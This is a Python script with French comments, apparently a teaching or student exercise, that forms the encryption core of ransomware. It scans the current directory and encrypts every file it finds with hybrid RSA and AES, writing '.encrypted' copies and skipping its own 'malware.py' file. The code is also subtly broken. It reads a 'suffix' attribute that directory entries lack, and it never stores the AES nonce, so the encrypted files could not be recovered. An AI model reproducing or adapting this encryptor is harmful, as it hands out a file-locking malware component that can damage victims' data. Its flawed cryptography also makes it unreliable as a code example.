import base64
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Ce code nous permet d'avoir la cle publique
with open('public.pem', 'rb') as f:
    pubKey = f.read()

files = []
excludeExtension = ['.py', '.pem', '.exe']
def scan_dir():
    """Cette fonction parcourt récursivement les fichiers dans le répertoire courant."""
    for entry in os.scandir():
        fileType= entry.suffix.lower()
        if entry.name in ("malware.py", "generatekey.py"):
            continue
        if fileType in excludeExtension:
            continue
        else: 
            if entry.is_file():
               files.append(entry.path)

def encrypt(data_file, public_key):
    """Cette fonction chiffre les données d'un fichier avec une clé RSA et une clé de session AES."""
    with open(data_file, "rb") as f:
        data = f.read()

    # Créer un objet clé public
    key = RSA.import_key(public_key)
    # générer une clé de session qui sera utilisée pour chiffrer les données.
    session_key = os.urandom(16)

    # Crypter la session avec la clé de session
    cipher = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Chiffrer la clé de session avec la clé RSA
    cipher_rsa = PKCS1_OAEP.new(key)
    encrypted_session_key = cipher_rsa.encrypt(session_key)

    # Sauvegarder les données encryptees dans un fichier
    encrypted_file = data_file + ".encrypted"
    if not os.path.isfile(encrypted_file):
        with open(encrypted_file, 'wb') as f:
            encrypted_data = encrypted_session_key + ciphertext + tag
            f.write(encrypted_data)
    else:
        print(f"Le fichier {encrypted_file} existe déjà.")


# Exemple d'utilisation
scan_dir()
for file in files:
    encrypt(file, pubKey)
